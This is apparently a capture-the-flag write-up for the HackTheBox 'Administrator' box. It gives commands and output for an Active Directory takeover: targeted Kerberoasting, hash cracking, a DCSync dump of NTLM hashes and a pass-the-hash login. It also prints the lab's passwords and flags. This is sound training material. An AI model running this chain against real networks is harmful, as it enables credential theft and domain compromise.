# Administrator 🔸

![](../assets/Pasted%20image%2020250504235752.png)

## Machine Information

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: **Olivia** Password: **ichliebedich**

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.42 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 17:58 EDT
Nmap scan report for 10.10.11.42
Host is up (0.041s latency).
Not shown: 65367 closed tcp ports (reset), 142 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-05 04:59:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
51425/tcp open  msrpc         Microsoft Windows RPC
54570/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54575/tcp open  msrpc         Microsoft Windows RPC
54582/tcp open  msrpc         Microsoft Windows RPC
54587/tcp open  msrpc         Microsoft Windows RPC
54601/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-05T05:00:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   39.76 ms 10.10.14.1
2   40.42 ms 10.10.11.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.50 seconds
```

##  Initial Access

Use the provided credentials via evil-winrm

```shell
$ evil-winrm -i 10.10.11.42 -u olivia -p ichliebedich
                                        
Evil-WinRM shell v3.7
                                                                         
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami
administrator\olivia
```

## Privilege Escalation

Get AD data via bloodhound-python

![](../assets/Pasted%20image%2020250505021419.png)

Olivia has GenericAll over michael and michael has ForceChangePassword over benjamin

![](../assets/Pasted%20image%2020250505023228.png)

Benjamin can access the ftp service

```shell
$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:kali): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||61964|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> download Backup.psafe3
```

Download the backup and using pwsafe2john and john get the password

```shell
$ pwsafe2john Backup.psafe3 > hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                               
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-05-05 02:34) 2.702g/s 16605p/s 16605c/s 16605C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`tekieromucho`

Open the backup with `pwsafe` command and put the master password

![](../assets/Pasted%20image%2020250505023744.png)

Our target is emily because she can GenericWrite etahn and ethan can DCSync the domain

![](../assets/Pasted%20image%2020250505023938.png)

![](../assets/Pasted%20image%2020250505024002.png)

So targetedkerberoast ethan with emily's password

```shell
$ python targetedKerberoast.py -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --request-user ethan
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c0bf5291fc4944046137e771eae509cb$1f8c42d856c0f6cbbebf4756f105640f0bd75913d293e4341965072fa60c73d3a124ed4530f843f581f1bd9d6fd9d60d7013e79aaed7d4f1dd125ca486e8a4722d8c5b42209692dd9a528121b18706808d3610fe828cb53cf5d99bbdd67242a4fd95ec3d4c92bc8747fa77eae1bbfb28d96aca997ba606c02b47e3d74e25b38865d2bae82b735cdaa43b699b04cf1b506719f037a691bfaaa55e13aff367d7e6179fcbdd25c4857356aa9ed7aa0faf12e9a72e80aa0a8dc390f5ddb603dc4cc2c3bb2e91852bd1886e07e9c0fec08ede2078d0c2b9dfc97b1ad73c1371f6721e8bf9f162670b921b90427d9566772c2bdfd921f3d4a486de95bf3d7c9b3801162bc6fe5d376f6106c981e12eb4e4292f03a94d0377ed2e5458695a1ed1d77bb3e468a39dae92e75b64d72dbf29215f9680b46c0cadef50bbd6d8089d70f945da229face4f3fcadd080c0c5d0ab52a17605ca27fe3c68248696b7f35b861597687a275cf3a145384ec922cc5aeb4eacd0a439ca2d47d8308a996be3db497c0181c073032d53ede29a63330f1bbd1c2233639b29f4c117d3967dd2aa59de81673338159903a57f35b3f83cbbacd720d097561956d2cec7cc763d7e94b5ff096bcd9972b714bd1626aa4020bbcda4b5b3b49bbb57682f0485e450ac2d9e83e66ca5e31cc99ec0a5b2d3198e88f3ecbd553d6653ef9e487de8a597de7bda176c6d8e8acc316a4597b25cfce1484786a1ab249d4aafa50c23bd2a83d4982c03f75d3995c3e17a8b3dd4cff2e253bc7052349e971ccf8b9e0c9caf68af0c18ad86130db234aae7a005f824b26013d2ab240ae20943fae02f00dd69fecc428800522e8033cbd5cd1790272bbcb7aa50668cf4a7d104799e1f590bc26eb45356b03732670dbff0395ce4b972812f8253868f268f3b148c2484afd0b30302b9d2b36fa8d5a9a9b0207cc65429085ea621a5e2ac99b35eaa5f14a72f77cdf643e6114a8a78971be88e1feff3353da94986a50ed4acc72354920e5df42750417f1457f83962bedd8b15ee87111838ef70bf5a39b11aec70b5eb33fb2aed5ea957f9d5bc71ebb381360c85af6b1dfde92998f57b4238fa6188c0363d0c434a08a2a51d1a779b3b2cd4e3e19d1484d89ab328085c2a95127d13797afb398b79da04bc016c01ed756a871ec6abfa27c64907c23b9d92df09628b83d5254403522deaabfe3978beeb77f45020981cffabb9b17e89b86d53f50e491bd4e0868ea94538f9ef12b1701a31a81665c08beefe2facf09c4ad4dfd01b2468b081cb90a172a135254cad7e10c0ed7503cb9435d3a690d29eeccd9ce212ecc13da4458eefdc63163311d508c6b6d88d48c43dbfe0ac29a18d92ce57afb33da7c702923f76ae4f5c05c66fe71813a19231d9e9404daf0230337b0de0b795eaaee2b4878b7a6ae75b9e7af1a6197f9c95ad6c251c439a173dc10331669366b3497707a4d9db22c55708cae825c86f70964625ca5c55586e63b974ba280a598a63959370fc2fac9284f34098
```

Crack the hash

```shell
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force 
hashcat (v6.2.6) starting

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c0bf5291fc4944046137e771eae509cb$1f8c42d856c0f6cbbebf4756f105640f0bd75913d293e4341965072fa60c73d3a124ed4530f843f581f1bd9d6fd9d60d7013e79aaed7d4f1dd125ca486e8a4722d8c5b42209692dd9a528121b18706808d3610fe828cb53cf5d99bbdd67242a4fd95ec3d4c92bc8747fa77eae1bbfb28d96aca997ba606c02b47e3d74e25b38865d2bae82b735cdaa43b699b04cf1b506719f037a691bfaaa55e13aff367d7e6179fcbdd25c4857356aa9ed7aa0faf12e9a72e80aa0a8dc390f5ddb603dc4cc2c3bb2e91852bd1886e07e9c0fec08ede2078d0c2b9dfc97b1ad73c1371f6721e8bf9f162670b921b90427d9566772c2bdfd921f3d4a486de95bf3d7c9b3801162bc6fe5d376f6106c981e12eb4e4292f03a94d0377ed2e5458695a1ed1d77bb3e468a39dae92e75b64d72dbf29215f9680b46c0cadef50bbd6d8089d70f945da229face4f3fcadd080c0c5d0ab52a17605ca27fe3c68248696b7f35b861597687a275cf3a145384ec922cc5aeb4eacd0a439ca2d47d8308a996be3db497c0181c073032d53ede29a63330f1bbd1c2233639b29f4c117d3967dd2aa59de81673338159903a57f35b3f83cbbacd720d097561956d2cec7cc763d7e94b5ff096bcd9972b714bd1626aa4020bbcda4b5b3b49bbb57682f0485e450ac2d9e83e66ca5e31cc99ec0a5b2d3198e88f3ecbd553d6653ef9e487de8a597de7bda176c6d8e8acc316a4597b25cfce1484786a1ab249d4aafa50c23bd2a83d4982c03f75d3995c3e17a8b3dd4cff2e253bc7052349e971ccf8b9e0c9caf68af0c18ad86130db234aae7a005f824b26013d2ab240ae20943fae02f00dd69fecc428800522e8033cbd5cd1790272bbcb7aa50668cf4a7d104799e1f590bc26eb45356b03732670dbff0395ce4b972812f8253868f268f3b148c2484afd0b30302b9d2b36fa8d5a9a9b0207cc65429085ea621a5e2ac99b35eaa5f14a72f77cdf643e6114a8a78971be88e1feff3353da94986a50ed4acc72354920e5df42750417f1457f83962bedd8b15ee87111838ef70bf5a39b11aec70b5eb33fb2aed5ea957f9d5bc71ebb381360c85af6b1dfde92998f57b4238fa6188c0363d0c434a08a2a51d1a779b3b2cd4e3e19d1484d89ab328085c2a95127d13797afb398b79da04bc016c01ed756a871ec6abfa27c64907c23b9d92df09628b83d5254403522deaabfe3978beeb77f45020981cffabb9b17e89b86d53f50e491bd4e0868ea94538f9ef12b1701a31a81665c08beefe2facf09c4ad4dfd01b2468b081cb90a172a135254cad7e10c0ed7503cb9435d3a690d29eeccd9ce212ecc13da4458eefdc63163311d508c6b6d88d48c43dbfe0ac29a18d92ce57afb33da7c702923f76ae4f5c05c66fe71813a19231d9e9404daf0230337b0de0b795eaaee2b4878b7a6ae75b9e7af1a6197f9c95ad6c251c439a173dc10331669366b3497707a4d9db22c55708cae825c86f70964625ca5c55586e63b974ba280a598a63959370fc2fac9284f34098:limpbizkit
```

`ethan:limpbizkit`

Get all hashes with secretsdump

```bash
$ impacket-secretsdump administrator/ethan:limpbizkit@10.10.11.42 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
```

```shell
$ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7                            
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```

## Post Exploitation

Get the flags

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
903ab631107c78c01b76bdedf53c8d87
*Evil-WinRM* PS C:\Users> type emily\desktop\user.txt
ac967fb472105391860439401a5ff15d
```